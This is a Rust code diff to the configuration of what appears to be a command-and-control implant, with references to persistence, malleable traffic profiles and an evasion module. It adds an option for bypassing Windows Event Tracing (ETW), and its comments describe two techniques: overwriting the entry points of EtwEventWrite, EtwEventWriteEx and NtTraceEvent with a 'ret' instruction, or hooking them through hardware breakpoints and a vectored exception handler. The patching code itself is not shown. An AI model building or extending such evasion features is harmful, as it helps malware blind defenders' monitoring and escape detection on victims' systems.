@@ -1,6 +1,24 @@
 use crate::normalized_transport::TrafficProfile;
 use std::path::PathBuf;
 
+/// ETW bypass strategy for Windows targets.
+///
+/// `Direct` (the default) overwrites the entry point of `EtwEventWrite`,
+/// `EtwEventWriteEx`, and `NtTraceEvent` with a `ret` instruction.  No debug
+/// registers are consumed and there is no exception-handler overhead.
+///
+/// `Hwbp` uses hardware breakpoints (Dr0–Dr3) via a vectored exception handler,
+/// which is the approach implemented in `evasion::setup_hardware_breakpoints`.
+/// Both methods may be active simultaneously: `Hwbp` remains the fallback when
+/// `VirtualProtect` is blocked by CFG or other policy.
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
+#[serde(rename_all = "kebab-case")]
+pub enum EtwPatchMethod {
+    #[default]
+    Direct,
+    Hwbp,
+}
+
 #[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
 #[serde(rename_all = "kebab-case")]
 pub enum ExecStrategy {
@@ -234,6 +252,11 @@ pub struct Config {
     /// individual mechanisms without rebuilding the agent.
     #[serde(default)]
     pub persistence: PersistenceConfig,
+    /// ETW bypass method. Defaults to [`EtwPatchMethod::Direct`] (overwrite
+    /// function entry with `ret`) when absent. Set to `hwbp` to use the
+    /// hardware-breakpoint VEH approach instead.
+    #[serde(default)]
+    pub etw_patch_method: Option<EtwPatchMethod>,
 }
 
 /// Per-platform list of persistence mechanisms to install.
@@ -401,6 +424,7 @@ impl Default for Config {
             malleable_profile: MalleableProfile::default(),
             exec_strategy: ExecStrategy::Indirect,
             persistence: PersistenceConfig::default(),
+            etw_patch_method: None,
         }
     }
 }
